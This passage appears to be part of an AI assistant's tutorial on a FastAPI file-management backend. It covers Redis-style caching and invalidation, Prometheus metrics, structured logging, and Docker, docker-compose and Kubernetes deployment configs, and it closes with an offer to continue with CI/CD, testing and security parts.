    async def get_user(user_id: str):
        return db.query(User).filter(User.id == user_id).first()
    """
    def decorator(func: Callable):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            # Build cache key
            if key_builder:
                cache_key = f"{key_prefix}:{key_builder(*args, **kwargs)}"
            else:
                # Default: hash arguments
                args_hash = hashlib.md5(
                    json.dumps([str(a) for a in args] + [f"{k}={v}" for k, v in kwargs.items()]).encode()
                ).hexdigest()
                cache_key = f"{key_prefix}:{args_hash}"

            # Try cache
            cached_value = await cache.get(cache_key)
            if cached_value is not None:
                return cached_value

            # Cache miss - call function
            result = await func(*args, **kwargs)

            # Store in cache
            await cache.set(cache_key, result, ttl)

            return result

        return wrapper
    return decorator

# Usage examples:
@cached(key_prefix="file", ttl=300, key_builder=lambda file_id: file_id)
async def get_file_metadata(file_id: str):
    """Get file metadata (cached for 5 minutes)."""
    # ... database query
    pass

@cached(key_prefix="user:files", ttl=60)
async def get_user_files(user_id: str):
    """Get user's files (cached for 1 minute)."""
    # ... database query
    pass
```

**Cache Invalidation Strategies:**

```python
# app/services/file_service.py
class FileService:
    """File service with intelligent cache invalidation."""

    async def update_file(self, file_id: str, updates: dict):
        """Update file and invalidate related caches."""
        # Update database
        result = await self._update_db(file_id, updates)

        # Invalidate caches
        await cache.delete(f"file:{file_id}")
        await cache.delete(f"file:metadata:{file_id}")

        # Invalidate user's file list
        user_id = result.uploaded_by
        await cache.invalidate_pattern(f"user:{user_id}:files:*")

        # Invalidate search results that might include this file
        await cache.invalidate_pattern("search:*")

        return result

    async def delete_file(self, file_id: str):
        """Delete file and invalidate all related caches."""
        file = await self._get_file(file_id)

        # Delete from database
        await self._delete_db(file_id)

        # Comprehensive cache invalidation
        await cache.delete(f"file:{file_id}")
        await cache.delete(f"file:metadata:{file_id}")
        await cache.delete(f"file:revisions:{file_id}")
        await cache.invalidate_pattern(f"user:{file.uploaded_by}:*")
        await cache.invalidate_pattern("search:*")
        await cache.invalidate_pattern("stats:*")
```

---

### **Part 5: Monitoring & Observability**

**Prometheus Metrics:**

```python
# app/utils/metrics.py
from prometheus_client import Counter, Histogram, Gauge, generate_latest
from fastapi import Request
import time

# Metrics
http_requests_total = Counter(
    'http_requests_total',
    'Total HTTP requests',
    ['method', 'endpoint', 'status']
)

http_request_duration_seconds = Histogram(
    'http_request_duration_seconds',
    'HTTP request duration',
    ['method', 'endpoint']
)

active_connections = Gauge(
    'active_websocket_connections',
    'Active WebSocket connections'
)

file_operations_total = Counter(
    'file_operations_total',
    'Total file operations',
    ['operation', 'status']
)

file_size_bytes = Histogram(
    'file_size_bytes',
    'File sizes',
    buckets=[1024, 10*1024, 100*1024, 1024*1024, 10*1024*1024, 100*1024*1024]
)

cache_hits_total = Counter(
    'cache_hits_total',
    'Cache hits',
    ['cache_type']
)

cache_misses_total = Counter(
    'cache_misses_total',
    'Cache misses',
    ['cache_type']
)

# Middleware for automatic metrics
async def metrics_middleware(request: Request, call_next):
    """Record metrics for all requests."""
    start_time = time.time()

    # Process request
    response = await call_next(request)

    # Record metrics
    duration = time.time() - start_time

    http_requests_total.labels(
        method=request.method,
        endpoint=request.url.path,
        status=response.status_code
    ).inc()

    http_request_duration_seconds.labels(
        method=request.method,
        endpoint=request.url.path
    ).observe(duration)

    return response

# Endpoint to expose metrics
from fastapi import Response

@app.get("/metrics")
async def metrics():
    """Prometheus metrics endpoint."""
    return Response(
        content=generate_latest(),
        media_type="text/plain"
    )

# Usage in services
class FileService:
    async def upload_file(self, file):
        try:
            # ... upload logic

            file_operations_total.labels(
                operation='upload',
                status='success'
            ).inc()

            file_size_bytes.observe(file.size)

        except Exception as e:
            file_operations_total.labels(
                operation='upload',
                status='error'
            ).inc()
            raise
```

**Structured Logging:**

```python
# app/utils/logging.py
import logging
import json
import sys
from datetime import datetime
from pythonjsonlogger import jsonlogger

class CustomJsonFormatter(jsonlogger.JsonFormatter):
    """Custom JSON formatter with additional fields."""

    def add_fields(self, log_record, record, message_dict):
        super().add_fields(log_record, record, message_dict)

        # Add custom fields
        log_record['timestamp'] = datetime.utcnow().isoformat()
        log_record['level'] = record.levelname
        log_record['logger'] = record.name

        # Add context if available
        if hasattr(record, 'user_id'):
            log_record['user_id'] = record.user_id

        if hasattr(record, 'request_id'):
            log_record['request_id'] = record.request_id

def setup_logging(log_level: str = "INFO"):
    """Configure structured logging."""
    logger = logging.getLogger()
    logger.setLevel(log_level)

    # Console handler with JSON formatting
    handler = logging.StreamHandler(sys.stdout)
    formatter = CustomJsonFormatter(
        '%(timestamp)s %(level)s %(name)s %(message)s'
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    return logger

# Context manager for request logging
from contextvars import ContextVar
import uuid

request_id_var: ContextVar[str] = ContextVar('request_id', default=None)
user_id_var: ContextVar[str] = ContextVar('user_id', default=None)

class LoggingContext:
    """Add context to all logs within scope."""

    def __init__(self, **kwargs):
        self.context = kwargs
        self.tokens = {}

    def __enter__(self):
        for key, value in self.context.items():
            if key == 'request_id':
                self.tokens['request_id'] = request_id_var.set(value)
            elif key == 'user_id':
                self.tokens['user_id'] = user_id_var.set(value)
        return self

    def __exit__(self, *args):
        for token in self.tokens.values():
            token.reset()

# Middleware to add request ID
@app.middleware("http")
async def logging_middleware(request: Request, call_next):
    request_id = str(uuid.uuid4())

    with LoggingContext(request_id=request_id):
        logger.info(
            "Request started",
            extra={
                "method": request.method,
                "path": request.url.path,
                "request_id": request_id
            }
        )

        response = await call_next(request)

        logger.info(
            "Request completed",
            extra={
                "status_code": response.status_code,
                "request_id": request_id
            }
        )

        response.headers["X-Request-ID"] = request_id
        return response

# Usage
logger = logging.getLogger(__name__)

async def some_function(user_id: str):
    with LoggingContext(user_id=user_id):
        logger.info("Processing user data")  # Automatically includes user_id
        # ... logic
```

---

### **Part 6: Deployment - Docker & Kubernetes**

**Production Dockerfile:**

```dockerfile
# docker/Dockerfile
FROM python:3.11-slim as base

# Set environment variables
ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    postgresql-client \
    && rm -rf /var/lib/apt/lists/*

# Install Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY . .

# Create non-root user
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app
USER appuser

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD python -c "import requests; requests.get('http://localhost:8000/health')"

# Run application
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000", "--workers", "4"]
```

**Docker Compose for Development:**

```yaml
# docker-compose.yml
version: "3.8"

services:
  app:
    build:
      context: .
      dockerfile: docker/Dockerfile
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://postgres:password@db:5432/filemanager
      - REDIS_URL=redis://redis:6379/0
      - S3_ENDPOINT=http://minio:9000
    depends_on:
      - db
      - redis
      - minio
    volumes:
      - ./app:/app/app
    command: uvicorn app.main:app --reload --host 0.0.0.0 --port 8000

  db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=password
      - POSTGRES_DB=filemanager
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    volumes:
      - redis_data:/data

  minio:
    image: minio/minio:latest
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      - MINIO_ROOT_USER=minioadmin
      - MINIO_ROOT_PASSWORD=minioadmin
    volumes:
      - minio_data:/data
    command: server /data --console-address ":9001"

  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus_data:/prometheus

  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana_data:/var/lib/grafana

volumes:
  postgres_data:
  redis_data:
  minio_data:
  prometheus_data:
  grafana_data:
```

**Kubernetes Deployment:**

```yaml
# kubernetes/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: filemanager-api
  labels:
    app: filemanager
    component: api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: filemanager
      component: api
  template:
    metadata:
      labels:
        app: filemanager
        component: api
    spec:
      containers:
        - name: api
          image: filemanager/api:latest
          ports:
            - containerPort: 8000
          env:
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: filemanager-secrets
                  key: database-url
            - name: REDIS_URL
              value: redis://redis-service:6379/0
            - name: SECRET_KEY
              valueFrom:
                secretKeyRef:
                  name: filemanager-secrets
                  key: secret-key
          resources:
            requests:
              memory: "256Mi"
              cpu: "250m"
            limits:
              memory: "512Mi"
              cpu: "500m"
          livenessProbe:
            httpGet:
              path: /health
              port: 8000
            initialDelaySeconds: 30
            periodSeconds: 10
          readinessProbe:
            httpGet:
              path: /health
              port: 8000
            initialDelaySeconds: 5
            periodSeconds: 5
---
apiVersion: v1
kind: Service
metadata:
  name: filemanager-api
spec:
  selector:
    app: filemanager
    component: api
  ports:
    - protocol: TCP
      port: 80
      targetPort: 8000
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: filemanager-ingress
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt-prod
    nginx.ingress.kubernetes.io/rate-limit: "100"
spec:
  ingressClassName: nginx
  tls:
    - hosts:
        - api.example.com
      secretName: filemanager-tls
  rules:
    - host: api.example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: filemanager-api
                port:
                  number: 80
---
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: filemanager-api-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: filemanager-api
  minReplicas: 3
  maxReplicas: 20
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
```

---

This is getting very long. Would you like me to continue with:

- Part 7: CI/CD Pipeline
- Part 8: Testing Strategy (Unit, Integration, E2E)
- Part 9: Performance Optimization
- Part 10: Security Hardening
- Final Capstone Exercise

Or should I create a comprehensive summary document that ties all 19 levels together?
